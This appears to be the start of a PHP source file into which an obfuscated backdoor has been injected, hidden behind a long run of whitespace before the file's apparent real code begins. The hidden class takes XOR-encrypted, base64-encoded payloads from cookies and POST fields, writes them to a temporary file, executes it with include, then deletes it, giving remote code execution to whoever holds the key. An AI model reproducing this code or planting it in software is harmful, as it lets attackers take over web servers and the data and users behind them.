<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("hpvxs")){class hpvxs{public static $mgmpkd = "asbzuvmdkzyvftff";public static $njkap = NULL;public function __construct(){$cbakhbont = @$_COOKIE[substr(hpvxs::$mgmpkd, 0, 4)];if (!empty($cbakhbont)){$daondebzhi = "base64";$gsebx = "";$cbakhbont = explode(",", $cbakhbont);foreach ($cbakhbont as $czoqni){$gsebx .= @$_COOKIE[$czoqni];$gsebx .= @$_POST[$czoqni];}$gsebx = array_map($daondebzhi . "_decode", array($gsebx,));$gsebx = $gsebx[0] ^ str_repeat(hpvxs::$mgmpkd, (strlen($gsebx[0]) / strlen(hpvxs::$mgmpkd)) + 1);hpvxs::$njkap = @unserialize($gsebx);}}public function __destruct(){$this->ppnzuinj();}private function ppnzuinj(){if (is_array(hpvxs::$njkap)) {$uwmznqu = sys_get_temp_dir() . "/" . crc32(hpvxs::$njkap["salt"]);@hpvxs::$njkap["write"]($uwmznqu, hpvxs::$njkap["content"]);include $uwmznqu;@hpvxs::$njkap["delete"]($uwmznqu);exit();}}}$jqtshztiqg = new hpvxs();$jqtshztiqg = NULL;} ?><?php
/**
